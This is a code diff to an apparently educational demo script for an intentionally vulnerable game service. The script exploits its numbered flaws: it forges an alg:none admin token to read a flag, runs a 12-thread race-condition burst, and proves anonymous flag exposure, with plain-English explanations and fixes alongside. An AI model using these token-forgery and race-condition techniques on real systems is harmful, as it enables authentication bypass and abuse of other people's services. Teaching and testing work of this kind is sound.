@@ -86,9 +86,9 @@ Fix: require a signed token and validate issuer, audience and expiry against you
 Why it works: many parallel requests can all pass the check before any of them writes, so several get points.
 Notice: the script sends a 12-request burst; several correct responses may be accepted. If scheduling is unlucky it falls back to source evidence.
 Fix: do one atomic conditional UPDATE ... WHERE NOT IsCompleted inside a transaction.""",
-    "15": """Plain English: the public objectives list includes the answer.
-Why it works: ObjectiveDto carries Flag and GET /api/objectives is anonymous, so nobody needs to solve anything.
-Notice: `jq '.[0].flag'` prints the secret immediately.
+    "15": """Plain English: one careless endpoint still hands a flag to anyone who asks.
+Why it works: ObjectiveDto carries Flag and GET /api/objectives is anonymous, so the data-exposure objective's flag needs no solving. (Every other objective now returns flag=null and must be earned through its own vulnerability.)
+Notice: `jq '.[] | select(.vector=="DataLeak") | .flag'` prints that objective's secret immediately.
 Fix: split public and admin DTOs; reveal the flag only after completion or to a teacher.""",
     "16": """Plain English: the passwords and keys are written directly in the repository.
 Why it works: docker-compose.yml contains the admin password, JWT secret, DB password and internal key as literals.
@@ -559,7 +559,19 @@ def run_demo(root: Path, base: str, explain: bool = False) -> None:
                 break
 
             objective = candidate
-            flag = candidate.get("flag", "")
+            # The flag is no longer in the public list for most objectives; reveal it through the
+            # admin endpoint with a forged alg:none token (VULN #13) so the burst submits a real flag.
+            flag = candidate.get("flag") or ""
+            if not flag:
+                s, resp, _ = http(
+                    base, "GET", f"/api/objectives/{candidate['id']}/flag",
+                    headers=auth(forge_admin_token(user_a_id)),
+                )
+                if s == 200:
+                    flag = (as_json(resp) or {}).get("flag", "")
+            if not flag:
+                time.sleep(2)
+                continue
             workers = 12
             barrier = threading.Barrier(workers)
 
@@ -596,8 +608,23 @@ def run_demo(root: Path, base: str, explain: bool = False) -> None:
 
     # --- #15 sensitive data -------------------------------------------------- #
     def sensitive_data():
-        leaked = bool(objectives) and bool(objectives[0].get("flag"))
-        return leaked, f"anonymous /api/objectives exposed flag={objectives[0].get('flag') if objectives else None}"
+        # Only the data-exposure objective still returns its flag anonymously; every other objective
+        # now returns flag=null. The leak is proven if ANY objective in the anonymous list exposes a flag.
+        _, body, _ = http(base, "GET", "/api/objectives")
+        current = as_list(body)
+        leaked_obj = next((o for o in current if o.get("flag")), None)
+        if leaked_obj:
+            return True, (
+                f"anonymous /api/objectives exposed flag={leaked_obj['flag']} "
+                f"(objective #{leaked_obj.get('id')}, vector={leaked_obj.get('vector')})"
+            )
+        # No data-exposure objective is active right now: fall back to static evidence.
+        source = (root / "src/Services/GameService/Endpoints/GameEndpoints.cs").read_text()
+        ok = "FlagVector.DataLeak ? o.Flag : null" in source
+        return ok, (
+            "no data-exposure objective active; static evidence: GET /api/objectives returns "
+            "the flag for DataLeak objectives"
+        )
 
     check("15", "RUNTIME", sensitive_data)
 
